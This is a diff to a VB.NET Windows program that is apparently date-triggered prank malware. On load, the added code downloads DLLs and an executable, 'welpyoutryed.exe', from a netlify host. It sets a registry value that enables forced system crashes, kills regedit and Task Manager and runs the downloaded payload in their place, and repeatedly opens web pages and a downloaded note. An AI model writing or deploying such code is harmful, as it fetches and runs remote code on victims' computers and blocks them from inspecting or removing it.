@@ -7,9 +7,30 @@ Public Class Form1
     Dim working As Boolean = True
     Dim RegistryKey As Object
     Dim admin As Boolean = True
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll
         RegistryKey = CreateObject("WScript.Shell")
+        Try
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
+        "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
+        Catch ex As Exception
 
+        End Try
+        Try
+            My.Computer.Network.DownloadFile(
+               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
+              "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
+        Catch ex As Exception
+
+        End Try
+
+        Try
+            My.Computer.Network.DownloadFile(
+              "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
+             "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+        Catch ex As Exception
+
+        End Try
         Try 'remove... My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
             Dim fileq As System.IO.StreamWriter
 
@@ -20,6 +41,7 @@ Public Class Form1
             File.Delete("C:\YFShshfgsd.yuki")
 
             RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
+            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll", 1, "REG_DWORD")
             Try
                 My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
             Catch ex As Exception
@@ -34,6 +56,7 @@ Public Class Form1
             End If
 
         Catch ex As Exception
+
             admin = False
             If ex.ToString.Contains("denied") Then
                 If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
@@ -63,6 +86,7 @@ Public Class Form1
                 End If
                 If day = 10 AndAlso month = 1 Then
                     MsgBox("Your computer is still messed up (:")
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                 End If
                 If day = 1 AndAlso month = 3 Then
                     ur_pc_is_gone_lmao.Show()
@@ -93,12 +117,32 @@ Public Class Form1
                     Process.Start("https://youtu.be/dQw4w9WgXcQ")
                     rickrolled.Show()
                 End If
-                If month = 10 Then
+                If day = 1 AndAlso month = 10 Then
 
-                    Process.Start("https://youtu.be/dQw4w9WgXcQ")
-                    rickrolled.Show()
+                    MsgBox("No computer today go outsie to play", 0 + 64, "touchgrass")
+                    Timer4.Start()
                 End If
-
+                If day = 1 AndAlso month = 11 Then 'https://www.fittea.com/
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
+                End If
+                If day = 5 AndAlso month = 11 Then
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
+                End If
+                If day = 8 AndAlso month = 11 Then '
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
+                End If
+                If day = 11 AndAlso month = 11 Then '
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
+                End If
+                If day = 17 AndAlso month = 11 Then '
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
+                End If
+                If day = 20 AndAlso month = 11 Then '
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
+                End If
+                If day = 22 AndAlso month = 11 Then '
+                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
+                End If
                 If day = 1 AndAlso month = 12 Then
                     My.Settings.working = False
                     Try
@@ -207,26 +251,88 @@ Public Class Form1
 
         End Try
     End Sub
-
+    Dim working1 As Boolean = False
     Private Sub CehckforbadPross_Tick(sender As Object, e As EventArgs) Handles CehckforbadPross.Tick
         Dim p() As Process
 
         p = Process.GetProcessesByName("regedit")
-
         If p.Count > 0 Then
+            If working1 = False Then
+                working1 = True
 
-            Dim myProcess() As Process = System.Diagnostics.Process.GetProcessesByName("regedit.exe")
-            For Each mykill As Process In myProcess
-                mykill.Kill()
-            Next
+                Try
+                    Process.GetProcessesByName("regedit")(0).Kill()
+                Catch ex As Exception
+
+                End Try
+                Try
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
+
+                End Try
+                working1 = False
+            End If
+
 
         Else
+
             ' Process is not running
         End If
 
+        p = Process.GetProcessesByName("Taskmgr")
+        If p.Count > 0 Then
+            If working1 = False Then
+                working1 = True
+
+                Try
+                    Process.GetProcessesByName("Taskmgr")(0).Kill()
+                Catch ex As Exception
+
+                End Try
+                Try
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
+
+                End Try
+                working1 = False
+            End If
+
+
+        Else
+
+            ' Process is not running
+        End If
     End Sub
 
     Private Sub DateTimePicker1_ValueChanged(sender As Object, e As EventArgs)
 
+    End Sub
+
+    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
+        '
+        Try
+            Using client = New WebClient()
+                '  Using stream = client.OpenRead("http://www.google.com")
+
+            End Using
+            Try
+                My.Computer.Network.DownloadFile(
+        "https://incomparable-cascaron-802b94.netlify.app/note.txt",
+       "C:\Users\" & SystemInformation.UserName & "\note.txt")
+            Catch ex As Exception
+
+            End Try
+
+
+            Process.Start("C:\Users\" & SystemInformation.UserName & "\note.txt")
+            Timer4.Stop()
+            ' End Using
+        Catch
+
+        End Try
+    End Sub
+
+    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
+        Process.Start("https://www.fittea.com/")
     End Sub
 End Class
